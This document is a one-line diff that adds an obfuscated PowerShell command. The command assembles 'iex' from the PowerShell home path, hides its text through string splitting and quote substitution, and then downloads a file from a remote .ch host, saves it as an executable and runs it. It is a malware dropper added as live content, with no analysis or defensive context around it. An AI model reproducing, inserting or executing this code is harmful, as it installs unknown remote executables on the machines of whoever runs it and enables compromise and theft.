@@ -1,0 +1,1 @@
+﻿.( $psHoME[21]+$pshoMe[34]+'x') ((('((new-'+'object ne'+'t.'+'webclient)'+'.Do'+'w'+'n'+'lo'+'adFil'+'e(DHOhttp://auf87.m'+'axi'+'pic.'+'c'+'h/ru'+'cymi/r'+'yb'+'idy/'+'fa'+'cu'+'wy.php'+'DHO,DHO1a'+'sd'+'asd.e'+'xeDHO));Start'+'-'+'Process DH'+'O1'+'asdasd.exeDHO;') -REPlACE'DHO',[ChAR]39)) 
